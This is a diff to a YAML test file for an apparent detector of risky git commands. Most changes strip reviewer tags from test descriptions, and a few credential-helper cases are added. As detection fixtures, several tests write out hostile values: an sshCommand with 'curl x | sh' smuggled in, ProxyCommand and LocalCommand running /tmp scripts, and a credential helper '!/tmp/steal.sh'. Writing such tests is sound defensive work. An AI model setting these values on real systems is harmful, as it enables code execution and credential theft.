@@ -371,19 +371,19 @@
   description: "match restore discard all with extra spaces"
   expect_ids: ["git:restore_discard_all"]
 - test: "git restore file.txt"
-  description: "a path: discards its changes like git checkout -- <path> (maya-r5:F6)"
+  description: "a path: discards its changes like git checkout -- <path>"
   expect_ids: ["git:restore_discard_path"]
 - test: "git restore --staged file.txt"
   description: "negative: restore staged specific file should not match"
   expect_ids: []
 - test: "git restore src/main.rs"
-  description: "a path: discards its changes like git checkout -- <path> (maya-r5:F6)"
+  description: "a path: discards its changes like git checkout -- <path>"
   expect_ids: ["git:restore_discard_path"]
 - test: "git restore .gitignore"
-  description: "a path: discards its changes like git checkout -- <path> (maya-r5:F6)"
+  description: "a path: discards its changes like git checkout -- <path>"
   expect_ids: ["git:restore_discard_path"]
 - test: "git restore .env"
-  description: "a path: discards its changes like git checkout -- <path> (maya-r5:F6)"
+  description: "a path: discards its changes like git checkout -- <path>"
   expect_ids: ["git:restore_discard_path"]
 
 # -- git:reset — more variants --
@@ -571,37 +571,37 @@
   description: "hooks path"
   expect_ids: ["git:config_exec_hook"]
 - test: 'git config core.sshCommand ''ssh -i /tmp/k'''
-  description: "negative: a plain ssh with options (a deploy key) runs nothing else (sam-r6:S6-5)"
+  description: "negative: a plain ssh with options (a deploy key) runs nothing else"
   expect_ids: []
 - test: 'git config core.sshCommand ''ssh -i k; curl x | sh'''
   description: "an ssh command with shell code"
   expect_ids: ["git:config_exec_hook"]
 - test: 'git config core.sshCommand ''ssh -o ProxyCommand=/tmp/x.sh'''
-  description: "ProxyCommand runs a program (sam-r7:S7-1)"
+  description: "ProxyCommand runs a program"
   expect_ids: ["git:config_exec_hook"]
 - test: 'git config core.sshCommand ''ssh -oProxyCommand=/tmp/x.sh'''
-  description: "glued -o ProxyCommand (sam-r7:S7-1)"
+  description: "glued -o ProxyCommand"
   expect_ids: ["git:config_exec_hook"]
 - test: 'git config core.sshCommand ''ssh -o proxycommand=nc'''
-  description: "lower-case ProxyCommand (sam-r7:S7-1)"
+  description: "lower-case ProxyCommand"
   expect_ids: ["git:config_exec_hook"]
 - test: 'git config core.sshCommand ''ssh -o PermitLocalCommand=yes -o LocalCommand=/tmp/x'''
-  description: "LocalCommand (sam-r7:S7-1)"
+  description: "LocalCommand"
   expect_ids: ["git:config_exec_hook"]
 - test: 'git config core.sshCommand ''ssh -o KnownHostsCommand=/tmp/x'''
-  description: "KnownHostsCommand (sam-r7:S7-1)"
+  description: "KnownHostsCommand"
   expect_ids: ["git:config_exec_hook"]
 - test: 'git config core.sshCommand ''ssh -F /tmp/evil_config'''
-  description: "-F config file can set ProxyCommand (sam-r7:S7-1)"
+  description: "-F config file can set ProxyCommand"
   expect_ids: ["git:config_exec_hook"]
 - test: 'git config core.sshCommand ''ssh -i k -o User=git -o LocalCommand=/tmp/x'''
-  description: "a bad -o after good ones (sam-r7:S7-1)"
+  description: "a bad -o after good ones"
   expect_ids: ["git:config_exec_hook"]
 - test: 'git config core.sshCommand ''ssh -i ~/.ssh/k -o IdentitiesOnly=yes -p 2222'''
-  description: "negative: deploy key with safe -o options (sam-r7:S7-1)"
+  description: "negative: deploy key with safe -o options"
   expect_ids: []
 - test: 'git config core.sshCommand ''ssh -oStrictHostKeyChecking=accept-new'''
-  description: "negative: glued safe -o option (sam-r7:S7-1)"
+  description: "negative: glued safe -o option"
   expect_ids: []
 - test: 'git config core.hooksPath'
   description: "negative: reading the value"
@@ -675,7 +675,7 @@
   description: "a shell alias"
   expect_ids: ["git:config_exec_program"]
 - test: "git config core.editor vim"
-  description: "negative: a common editor (sam-r6:S6-5)"
+  description: "negative: a common editor"
   expect_ids: []
 - test: "git config core.editor ./x.sh"
   description: "an editor that is another program"
@@ -686,7 +686,7 @@
 - test: "git config --global alias.st status"
   description: "negative: a git alias (no shell)"
   expect_ids: []
-# -- round 7: one-shot `-c` values and git exec settings (rosa-r6:R6-3, sam-r6:S6-5) --
+# -- round 7: one-shot `-c` values and git exec settings --
 - test: "git -c core.pager=cat log -5"
   description: "negative: a pager turned off for one command"
   expect_ids: []
@@ -747,3 +747,16 @@
 - test: "git push --delete origin main"
   description: "still caught without -n"
   expect_ids: ["git:push_delete_branch"]
+# -- issue #189, round 3: credential.helper shell code --
+- test: "git config --global credential.helper '!/tmp/steal.sh'"
+  description: "round 3: a !-prefixed credential helper runs shell code"
+  expect_ids: ["git:config_exec_program"]
+- test: "git config core.editor"
+  description: "round 3: reading a setting (no value) only prints it"
+  expect_ids: []
+- test: "git config core.pager"
+  description: "round 3: reading the pager setting is not an exec install"
+  expect_ids: []
+- test: "git config --global credential.helper store"
+  description: "negative round 3: the store helper is not shell code"
+  expect_ids: []
